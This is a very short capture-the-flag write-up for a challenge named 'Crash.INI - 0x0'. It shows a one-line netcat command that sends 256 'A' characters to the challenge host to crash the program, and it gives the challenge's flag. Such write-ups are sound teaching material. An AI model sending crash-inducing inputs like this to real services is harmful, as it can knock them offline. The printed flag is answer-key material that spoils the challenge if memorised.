# Crash.INI - 0x0

## Write-up
Simply cause a segmentation fault.
```bash
python3 -c 'print("A"*256)' | nc $HOST $PORT
```

## Flag
`shellmates{g00d_j0b_y0u_cr4sh3d_th3_pr0gram}`
